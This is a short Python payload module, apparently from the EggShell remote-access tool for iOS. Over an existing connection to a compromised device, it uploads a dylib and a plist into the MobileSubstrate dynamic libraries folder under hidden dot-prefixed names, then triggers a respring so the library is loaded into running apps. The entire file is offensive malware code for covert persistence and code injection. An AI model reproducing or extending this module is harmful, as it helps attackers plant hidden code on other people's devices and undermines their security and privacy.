class payload:
    def __init__(self):
        self.name = "installpro"
        self.description = "installs eggshell tweak library"
        self.type = "native"
        self.id = 126

    def run(self,conn,server,command):
        server.uploadFile("src/binaries/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/.espro.dylib",conn)
        server.uploadFile("src/binaries/eggshellPro.plist","/Library/MobileSubstrate/DynamicLibraries/.espro.plist",conn)
        return "respring"
